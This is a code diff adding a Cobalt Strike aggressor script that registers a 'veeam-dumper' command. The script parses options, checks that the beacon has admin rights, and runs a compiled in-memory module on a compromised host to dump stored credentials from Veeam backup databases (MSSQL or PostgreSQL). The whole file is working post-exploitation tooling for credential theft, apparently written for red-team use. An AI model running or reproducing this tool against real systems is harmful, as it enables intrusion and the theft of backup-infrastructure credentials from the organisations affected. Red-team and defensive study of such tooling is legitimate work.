@@ -1,0 +1,120 @@
+
+beacon_command_register(
+    "veeam-dumper",
+    "Dumps credentials from Veeam Database.",
+    "Dump credentials from Veeam. Supports PSQL and MSSQL!\n\nUse: veeam-dumper [db type] [optional args]\n\n\t db type (Required):\tmssql, psql, auto \n\t --dbname (Optional):\tif blank will try pull from registry. \n\t --exepath (Optional):\tPath to sqlcmd.exe/psql.exe. If not specified will search \$PATH and common locations depending on the DB type \n\t --debug (Optional):\tEnables debug output\n\t --veeamone (Optional):\tRun VeeamOne mode\n\nExamples:\n\t veeam-dumper auto\n\t veeam-dumper psql --dbname VeeamBackup2016 --exepath \"C:\\Program Files\\pssql.exe\" --debug\n\t veeam-dumper mssql --debug --veeamone"
+);
+
+alias veeam-dumper {
+    local('$barch $handle $data $args $dbtype $dbname $exepath $debug $i $arg');
+   
+   if (!-isadmin $1){
+        berror($1, "Beacon is not admin! Command requires an admin beacon to read the right registry keys");
+        return;
+    }
+
+    # Figure out arguments    
+    $bid = $1;
+    $dbtype = $2;
+    $dbname = "";
+    $exepath = "";
+    $debug = 0;
+    $veeamone = 0;
+
+ 
+   
+    if (($dbtype eq "mssql") || ($dbtype eq "psql") || ($dbtype eq "auto") ){
+        
+        # figure out the arch of this session
+        $barch  = barch($1);
+            
+        
+        #println("args array: " . $data);
+        @args = split(' ', $0);
+        #println("args array: " . @args);
+        #println("Size of args: " . size(@args)); 
+        
+
+        for ($i = 2; $i < size(@args); $i++) {
+            $arg = @args[$i];
+            println("Processing: $arg")
+            if ($arg eq "--dbname") {
+                $dbname = @args[$i + 1];
+                println("DB Name: $dbname")
+                $i++;
+            }
+            else if ($arg eq "--exepath") {
+                $i++;
+                if ($i >= size(@args)) {
+                    println("Missing value for --exepath");
+                    return;
+                }
+
+                $path = @args[$i];
+
+                # Merge quoted path with spaces
+                if ((substr($path, 0, 1) eq '"' && substr($path, -1) ne '"') ||
+                    (substr($path, 0, 1) eq "'" && substr($path, -1) ne "'")) {
+
+                    $quote = substr($path, 0, 1);
+
+                    for ($i = $i + 1; $i < size(@args); $i++) {
+                        $arg2 = @args[$i];
+                        $path = $path . " " . $arg2;
+
+                        if (strlen($arg2) > 0 && substr($arg2, -1) eq $quote) {
+                            break;
+                        }
+                    }
+                }
+
+                # Strip surrounding quotes safely
+                if (strlen($path) >= 2) {
+                    if ((substr($path, 0, 1) eq '"' && substr($path, -1) eq '"') ||
+                        (substr($path, 0, 1) eq "'" && substr($path, -1) eq "'")) {
+                        $path = substr($path, 1, strlen($path) - 1);
+                    }
+                }
+
+                $exepath = $path;
+            
+            }
+            else if ($arg eq "--debug") {
+                $debug = 1;
+            }
+            else if ($arg eq "--veeamone") {
+                $veeamone = 1;
+            }else if ($arg eq "") {
+                println("Skipping empty arg: $arg");
+            }
+            else {
+                println("Unknown argument: $arg");
+                berror($1, "Unknown argument: $arg");
+                return;
+            }
+        }
+
+        println("dbname  = $dbname");
+        println("exepath = $exepath");
+        println("debug   = $debug");
+        # read in the right BOF file
+        $handle = openf(script_resource("cs_veeam_dumper. $+ $barch $+ .o"));
+        $data   = readb($handle, -1);
+        closef($handle);
+        
+        # pack our arguments: Bof expects:<dbtype> <db name> <exe path> <debug>
+        $args   = bof_pack($1, "zzzii", $dbtype,$dbname,$exepath,$debug,$veeamone);
+        
+        # announce what we're doing
+        btask($1, "Running Veeam Dumper BOF by @MWRCyberSec");
+
+        # execute it.
+        beacon_inline_execute($1, $data, "go", $args);
+
+    }else{
+        berror($1, "Mode must be auto, mssql or psql. Got $dbtype");
+        return;
+    }
+    
+   
+}
